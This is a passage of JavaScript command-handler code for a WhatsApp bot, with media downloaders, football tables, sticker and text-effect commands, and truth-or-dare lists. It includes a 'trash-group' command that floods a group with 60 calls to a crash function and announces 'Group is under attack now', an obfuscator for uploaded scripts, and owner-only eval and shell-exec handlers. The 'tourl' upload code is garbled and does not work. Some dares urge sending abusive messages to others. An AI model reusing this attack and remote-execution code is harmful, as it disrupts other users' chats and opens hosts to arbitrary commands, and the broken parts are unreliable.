  let teks1 = `\n\n*User* : @${m.sender.split("@")[0]}\n*Request/Bug* : ${text}`
  let teks2 = `\n\n*Hii ${pushname},You request has been forwarded to the support group*.\n*Please wait...*`
  const groupId = '120363400441291112@g.us'; // replace with your group ID
  trashcore.sendMessage(groupId, {
    text: textt + teks1,
    mentions: [m.sender],
  }, { quoted: m })
  trashcore.sendMessage(m.chat, {
    text: textt + teks2 + teks1,
    mentions: [m.sender],
  }, { quoted: m })
}
break


               
                
                    

    


    
//==================================================//
case 'fb': case 'facebook': case 'fbdl':
case 'ig': case 'instagram': case 'igdl': {
 if (!args[0]) return reply("🔗 provide a fb or ig link!");
 try {
 const axios = require('axios');
 const cheerio = require('cheerio');
 async function yt5sIo(url) {
 try {
 const form = new URLSearchParams();
 form.append("q", url);
 form.append("vt", "home");
 const { data } = await axios.post('https://yt5s.io/api/ajaxSearch', form, {
 headers: {
 "Accept": "application/json",
 "X-Requested-With": "XMLHttpRequest",
 "Content-Type": "application/x-www-form-urlencoded",
 },
 });
 if (data.status !== "ok") throw new Error("provide a valid link.");
 const $ = cheerio.load(data.data); 
 if (/^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(url)) {
 const thumb = $('img').attr("src");
 let links = [];
 $('table tbody tr').each((_, el) => {
 const quality = $(el).find('.video-quality').text().trim();
 const link = $(el).find('a.download-link-fb').attr("href");
 if (quality && link) links.push({ quality, link });
 });
 if (links.length > 0) {
 return { platform: "facebook", type: "video", thumb, media: links[0].link };
 } else if (thumb) {
 return { platform: "facebook", type: "image", media: thumb };
 } else {
 throw new Error("media is invalid.");
 }
 } else if (/^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(url)) {
 const video = $('a[title="Download Video"]').attr("href");
 const image = $('img').attr("src");
 if (video) {
 return { platform: "instagram", type: "video", media: video };
 } else if (image) {
 return { platform: "instagram", type: "image", media: image };
 } else {
 throw new Error("Media invalid.");
 }
 } else {
 throw new Error("provide a valid url or link.");
 }
 } catch (error) {
 return { error: error.message };
 }
 }
 await trashcore.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 let res = await yt5sIo(args[0]);
 if (res.error) {
 await trashcore.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 return reply(`⚠ *Error:* ${res.error}`);
 }
 if (res.type === "video") {
 await trashcore.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await trashcore.sendMessage(m.chat, { video: { url: res.media }, caption: "✅ *Downloaded by Silencer media Team!*" }, { quoted: m });
 } else if (res.type === "image") {
 await trashcore.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await trashcore.sendMessage(m.chat, { image: { url: res.media }, caption: "✅ *Downloaded photo by silencer media team!*" }, { quoted: m });
 }
 } catch (error) {
 console.error(error);
 await trashcore.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 reply("failed to get media.");
 }
}
break
//==================================================//
case 'tiktok': {
if (!text) return reply(`Use : ${prefix + command} link`)
// wait message
trashreply(mess.wait)
let data = await fg.tiktok(text)
let json = data.result
let caption = `[ TIKTOK - DOWNLOAD ]\n\n`
caption += `◦ *Id* : ${json.id}\n`
caption += `◦ *Username* : ${json.author.nickname}\n`
caption += `◦ *Title* : ${(json.title)}\n`
caption += `◦ *Like* : ${(json.digg_count)}\n`
caption += `◦ *Comments* : ${(json.comment_count)}\n`
caption += `◦ *Share* : ${(json.share_count)}\n`
caption += `◦ *Play* : ${(json.play_count)}\n`
caption += `◦ *Created* : ${json.create_time}\n`
caption += `◦ *Size* : ${json.size}\n`
caption += `◦ *Duration* : ${json.duration}`
if (json.images) {
json.images.forEach(async (k) => {
await trashcore.sendMessage(m.chat, { image: { url: k }}, { quoted: m });
})
} else {
trashcore.sendMessage(m.chat, { video: { url: json.play }, mimetype: 'video/mp4', caption: caption }, { quoted: m })
setTimeout(() => {
trashcore.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mpeg' }, { quoted: m })
}, 3000)
}
}
break //==================================================//
        case "disp-7": { 
                 if (!m.isGroup) return reply (mess.group); 
                 
                 if (!isAdmins) return reply (mess.admin); 
  
                     await trashcore.groupToggleEphemeral(m.chat, 7*24*3600); 
 m.reply('Dissapearing messages successfully turned on for 7 days!'); 
  
 } 
 break;  //==================================================//
case 'idch': case 'cekidch': {
if (!text) return reply("channel link?")
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link must be valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await trashcore.newsletterMetadata("invite", result)
let teks = `* *ID : ${res.id}*
* *Name :* ${res.name}
* *Total Followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: teks }, 
footer: {
text: "𝚅𝙴𝙽𝙾𝙼-𝚇𝙼𝙳" }, //input watermark footer
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
           },
     ], },},
    }, }, },{ quoted : fkontak });
await trashcore.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break
//==================================================//      
        case "epl": case "epl-table": {
		      
try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/PL');
        const standings = data.data;

        const message = ` 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗘𝗽𝗹 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀:-\n\n${standings}`;

        await m.reply(message);
    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗘𝗽𝗹 standings.');
    }

 }
	break;
		      
//========================================================================================================================//
	      case "laliga": case "pd-table": {
try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/PD');
        const standings = data.data;

        const message = `𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗟𝗮𝗹𝗶𝗴𝗮 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀:-\n\n${standings}`;
        await m.reply(message);

    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗟𝗮𝗹𝗶𝗴𝗮 standings.');
  }
}   
break;
		      
//========================================================================================================================//
	      case "bundesliga": case "bl-table": {
try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/BL1');
        const standings = data.data;

        const message = `𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀\n\n${standings}`;
        await m.reply(message);

    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮 standings.');
    }
}
break;
		      
//========================================================================================================================//
	      case "ligue-1": case "lg-1": {
  try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/FL1');
        const standings = data.data;

        const message = `𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗟𝗶𝗴𝘂𝗲-1 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀\n\n${standings}`;
        await m.reply(message);

    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗹𝗶𝗴𝘂𝗲-1 standings.');
    }
}
break;
		      
//========================================================================================================================//
	      case "serie-a": case "sa-table":{
try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/SA');
        const standings = data.data;

        const message = `𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗦𝗲𝗿𝗶𝗲-𝗮 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀\n\n${standings}`;
        await m.reply(message);

    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗦𝗲𝗿𝗶𝗲-𝗮 standings.');
    }
}
break;
//==================================================//
case 'enc':
case 'encrypt': {
const JsConfuser = require('js-confuser')

if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.quotedMessage) {
return reply('❌ Please Reply File To Be Encryption.');
}
const quotedMessage = m.message.extendedTextMessage.contextInfo.quotedMessage;
const quotedDocument = quotedMessage.documentMessage;
if (!quotedDocument || !quotedDocument.fileName.endsWith('.js')) {
return reply('❌ Please Reply File To Be Encryption.');
}
try {
const fileName = quotedDocument.fileName;
const docBuffer = await m.quoted.download();
if (!docBuffer) {
return reply('❌ Please Reply File To Be Encryption.');
}
await trashcore.sendMessage(m.chat, {
 react: { text: '🕛', key: m.key }
 });
const obfuscatedCode = await JsConfuser.obfuscate(docBuffer.toString(), {
target: "node",
preset: "high",
compact: true,
minify: true,
flatten: true,
identifierGenerator: function () {
const originalString = "素GIFTED晴DAVE晴" + "素GIFTED晴DAVE晴";
const removeUnwantedChars = (input) => input.replace(/[^a-zA-Z素GIFTED晴DAVE晴]/g, "");
const randomString = (length) => {
let result = "";
const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * characters.length));
}
return result;
};
return removeUnwantedChars(originalString) + randomString(2);
},
renameVariables: true,
renameGlobals: true,
stringEncoding: true,
stringSplitting: 0.0,
stringConcealing: true,
stringCompression: true,
duplicateLiteralsRemoval: 1.0,
shuffle: { hash: 0.0, true: 0.0 },
stack: true,
controlFlowFlattening: 1.0,
opaquePredicates: 0.9,
deadCode: 0.0,
dispatcher: true,
rgf: false,
calculator: true,
hexadecimalNumbers: true,
movedDeclarations: true,
objectExtraction: true,
globalConcealing: true,
});
await trashcore.sendMessage(m.chat, {
document: Buffer.from(obfuscatedCode, 'utf-8'),
mimetype: 'application/javascript',
fileName: `${fileName}`,
caption: `•Successful Encrypt
•Type: Hard Code
•@Tennormodz`,
}, { quoted: fkontak });

} catch (err) {
console.error('Error during encryption:', err);
await reply(`❌ An error occurred: ${error.message}`);
}
break;
}
  //==================================================//         
        case "tourl": { 
  // Check if the message is a quoted image
  if (!m.quoted) return reply("❌ Reply to the image with /tourlpub");

  // Download the quoted image
  let q = await m.quoted.download();
  if (!q) return reply("❌ Failed to download");

  // Create a new FormData object and append the image
  const FormData = require("form-data"),
    axios = require("axios"),
    form = new FormData();
  form.append("key", "LutBotz.Tamvan.dan.ganteng.banget.sumpah");
  form.append("file", q, { filename: "wa.png", contentType: "image/png" });

  // Send a POST request to the upload URL
  const r = await axios.post("https:")                                                                                      
  const z = r.data;

                                       
  if (!z.success) return reply("//rismajaya.my.id/tools/uploaders/uploads.php", form, { headers: form.getHeaders() });
  const d = r.data;

  // Check if the upload was successful
  if (!d.success) return reply("❌ " + d.error);

  // Send the public link
  await reply(`✅ Public link successfully created\n\n${d.url}`);
}
break;
//==================================================//   
        case 'ytmp4': {
  const axios = require('axios');
  const input = text?.trim();
  if (!input) return reply(`play:\n.ytmp4 https://youtu.be/xxxx,720\n\nList for results:\n- 360\n- 480\n- 720\n- 1080`);
  const [url, q = '720'] = input.split(',').map(a => a.trim());
  const validUrl = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\//.test(url);
  if (!validUrl) return reply(`❌ URL YouTube is not valid!`);
  const qualityMap = {
    "360": 360,
    "480": 480,
    "720": 720,
    "1080": 1080
  };

  if (!qualityMap[q]) {
    return reply(`❌ Quality must be valid!\nexample: 360, 720, 1080`);
  }
  const quality = qualityMap[q];
  const sendResult = async (meta) => {
    await trashcore.sendMessage(m.chat, {
      image: { url: meta.image },
      caption: `✅ *Title:* ${meta.title}\n📥 *Type:* MP4\n🎚️ *Quality:* ${meta.quality}p\n\nSending  file...`,
    }, { quoted: m });
    await trashcore.sendMessage(m.chat, {
      document: { url: meta.downloadUrl },
      mimetype: 'video/mp4',
      fileName: `${meta.title}.mp4`
    }, { quoted: m });
  };

  try {
    const { data: start } = await axios.get(
      `https://p.oceansaver.in/ajax/download.php?button=1&start=1&end=1&format=${quality}&iframe_source=https://allinonetools.com/&url=${encodeURIComponent(url)}`,
      {
        timeout: 30000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }
      }
    );
    if (!start.progress_url) return m.reply(`❌ failed to start progress`);
    let progressUrl = start.progress_url;
    let meta = {
      image: start.info?.image || "https://telegra.ph/file/fd0028db8c3fc25d85726.jpg",
      title: start.info?.title || "Unknown Title",
      downloadUrl: "",
      quality: q,
      type: "mp4"
    };
    let polling, attempts = 0;
    const maxTry = 40;
    reply('⏳ processing video...');
    do {
      if (attempts >= maxTry) return reply(`❌ Timeout process!`);
      await new Promise(r => setTimeout(r, 3000));
      try {
        const { data } = await axios.get(progressUrl, {
          timeout: 15000,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
          }
        });
        polling = data;
        if (polling.progress < 100) console.log(`Progress: ${polling.progress}%`);
      } catch (e) {
        console.log(`Polling ${attempts + 1} gagal`);
      }
      attempts++;
    } while (!polling?.download_url);
    if (!polling.download_url) return reply(`❌ failed to get download from the link`);
    meta.downloadUrl = polling.download_url;
    return await sendResult(meta);
  } catch (e) {
    console.error(e);
    return reply(`❌ error has occurred: ${e.message || 'err'}`);
  }
}
break
//==================================================//           
        case 'trash-group': {
    if (!trashown) return reply("This Feature Only Send By Bot Number");
if (!m.isGroup) return reply(mess.group)
    trashcore.sendMessage(m.chat, { react: { text: '🆘', key: m.key } });
    
    //Paramater
    for (let r = 0; r < 15; r++) {
        
 await trashgc(m.chat);
await trashgc(m.chat);
await trashgc(m.chat);
await trashgc(m.chat);
    }
    await sleep(1000)
  console.log(chalk.red.bold("Success!"))
            reply(`[ 🔥 ] Group is under attack now
 _*\`Status\`*_ : *SUCCESS  ATTACK 鉁�*
 _*\`Type\`*_ : _${command}_
> pause for five-ten minutes to avoid ban

`)   
}
break;
//==================================================//     
        case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
trashcore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
//==================================================//         
        case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank':
case 'meow':
case 'tickle':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
trashcore.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
//==================================================//   
        case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return reply(`Example : ${prefix+command} Trash corr`) 
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
trashcore.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
//==================================================//        
        case 'truth':
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, xeon?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const xeontruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              trashcore.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ xeontruth }, {quoted:m})
              break
//==================================================//          
        case 'dare':
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner xeon through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              trashcore.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
              break
//━━━━━━━━━━━━━━━━━━━━━━━━//
default:
if (budy.startsWith('=>')) {
if (!trashown) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!trashown) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!trashown) return
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
}

} catch (err) {
  let error = err.stack || err.message || util.format(err);
  console.log('====== ERROR REPORT ======');
  console.log(error);
  console.log('==========================');

  await trashcore.sendMessage(`${error}@s.whatsapp.net`, {
    text: `⚠️ *ERROR!*\n\n📌 *Message:* ${err.message || '-'}\n📂 *Stack Trace:*\n${error}`,
    contextInfo: { forwardingScore: 9999999, isForwarded: true }
  }, { quoted: m });
}
}
//━━━━━━━━━━━━━━━━━━━━━━━━//
// File Update
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update File 📁 : ${__filename}`)
delete require.cache[file]
require(file)
})
